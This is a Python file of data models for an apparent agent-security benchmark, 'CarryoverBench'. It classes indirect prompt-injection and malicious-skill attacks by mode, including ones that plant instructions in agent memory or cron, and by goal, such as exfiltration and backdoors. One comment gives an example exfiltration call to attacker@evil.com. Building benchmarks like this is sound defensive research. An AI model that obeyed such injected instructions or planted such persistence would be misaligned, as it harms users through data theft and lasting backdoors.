"""
Core data models for CarryoverBench.

Attack taxonomy:  2 sources × 3 modes = 6 types
  Sources:  IPI (indirect prompt injection), Skill (malicious supply-chain skill)
  Modes:    Instant, Delayed, Persistent

Attack goals:  exfiltration, persistence, destruction, privilege_abuse, memory_extraction

Scoring:
  task_complexity (1-3):  how hard is the benign task for the agent
  attack_risk     (1-3):  how much damage if the attack succeeds
"""

from __future__ import annotations

import enum
import uuid
from dataclasses import dataclass, field
from typing import Any


# ── Attack taxonomy ────────────────────────────────────────────────────────

class AttackSource(enum.Enum):
    IPI = "ipi"          # Indirect Prompt Injection (in data: email, CSV, file)
    SKILL = "skill"      # Malicious skill (supply-chain)


class AttackMode(enum.Enum):
    INSTANT = "instant"       # Executes immediately during the same task
    DELAYED = "delayed"       # Seeds HEARTBEAT.md / cron, fires on next tick
    PERSISTENT = "persistent" # Writes to MEMORY.md, fires in future sessions


class AttackGoal(enum.Enum):
    """What the attacker wants to achieve."""
    EXFILTRATION = "exfiltration"            # Steal data and send externally
    PERSISTENCE = "persistence"              # Plant long-term backdoor (cron/memory)
    DESTRUCTION = "destruction"              # Delete/corrupt data
    PRIVILEGE_ABUSE = "privilege_abuse"       # Execute code, transfer money
    MEMORY_EXTRACTION = "memory_extraction"  # Read sensitive data from agent memory


class DangerLevel(enum.IntEnum):
    NONE = 0
    MINOR = 1
    MODERATE = 2
    SEVERE = 3


# ── Task + Payload (one payload per task) ─────────────────────────────────

@dataclass
class BenchmarkTask:
    """
    A complete benchmark entry: one benign task + one aligned attack payload.

    Each task is scored on:
      task_complexity (1-3): difficulty of the benign task
      attack_risk     (1-3): severity if the attack succeeds
    """
    # ── Task definition ──
    task_id: str
    name: str
    domain: str                            # email, calendar, files, messaging, finance, ...
    description: str
    user_prompt: str                       # benign instruction sent to agent
    tools_used: list[str]                  # nanobot built-in tools this task needs
    # ── Environment seed data ──
    env_files: dict[str, str] = field(default_factory=dict)  # path -> content
    env_file_sources: dict[str, str] = field(default_factory=dict)  # path -> provenance source
    # ── Aligned attack payload ──
    attack_goal: AttackGoal = AttackGoal.EXFILTRATION
    attack_mode: AttackMode | None = None  # instant / delayed / persistent
    attack_source: AttackSource = AttackSource.IPI  # ipi / skill
    injection_point: str = ""              # where IPI hides: email_body, csv_cell, file_content
    payload_text: str = ""                 # the malicious instruction hidden in data
    target_tool: str = ""                  # dangerous tool attacker wants agent to call
    target_action: str = ""                # specific call, e.g. "message(to=attacker@evil.com)"
    success_pattern: str = ""              # regex/keyword to detect attack success in trace
    attack_hint: str = ""                  # attacker strategy: why/how this payload works
    # ── Malicious Skill (for supply-chain variant) ──
    skill_name: str = ""                   # e.g. "inbox-organizer"
    skill_description: str = ""            # benign-looking description
    skill_md: str = ""                     # full SKILL.md content with hidden malicious step
    # ── Scoring ──
    task_complexity: int = 1               # 1-3
    attack_risk: int = 1                   # 1-3
    # ── Benchmark reference ──
    reference: str = ""                    # e.g. "AgentDojo-Workspace", "InjecAgent"


# ── Legacy compat (keep old code working) ─────────────────────────────────

@dataclass
class BenignTask:
    """A benign user task the agent should perform."""
    task_id: str
    name: str
    description: str
    user_prompt: str
    setup_fn: str | None = None
    expected_tool_calls: list[str] = field(default_factory=list)


@dataclass
class AttackPayload:
    attack_id: str
    attack_source: AttackSource
    attack_mode: AttackMode
    injection_point: str
    payload_text: str
    target_action: str
    danger_level: DangerLevel = DangerLevel.MODERATE

    @property
    def source(self) -> AttackSource:
        return self.attack_source

    @property
    def mode(self) -> AttackMode:
        return self.attack_mode


# ── Trial result ───────────────────────────────────────────────────────────

@dataclass
class TrialResult:
    trial_id: str = field(default_factory=lambda: uuid.uuid4().hex[:12])
    task_id: str = ""
    attack_id: str | None = None
    attack_variant: str | None = None

    # Metrics
    asr: bool = False                # Composite: plant ∧ trigger for delayed/persistent, plant only for instant
    asr_plant: bool = False          # Session 1: did the agent write the payload to persistent state (MEMORY.md / HEARTBEAT.md) or directly act (instant)?
    asr_trigger: bool = False        # Session 2: did the planted content actually cause the bad action to fire in a new session / heartbeat tick? (only meaningful for delayed/persistent)
    utility: float = 0.0             # 0.0–1.0: user task completion (weighted arithmetic mean with hard floor)
    utility_breakdown: dict = field(default_factory=dict)  # per-sub-task scores + gate status, for paper analysis
    danger: DangerLevel = DangerLevel.NONE
    recovery_steps: int = 0
    unrecovered: bool = False        # URR

    # Evidence
    tool_calls: list[dict] = field(default_factory=list)
    memory_after: str = ""
    heartbeat_md_after: str = ""
    cron_jobs_after: list[dict] = field(default_factory=list)
    workspace_files_changed: list[str] = field(default_factory=list)
    session_messages: list[dict] = field(default_factory=list)       # Session 1 (plant phase)
    session2_messages: list[dict] = field(default_factory=list)      # Session 2 (trigger phase — heartbeat tick / new session) — last round when multi-round
    trig_per_round: list[bool] = field(default_factory=list)         # Per-round trigger results for delayed/persistent multi-round runs; empty for instant/clean

    # Judge
    judge_notes: str = ""
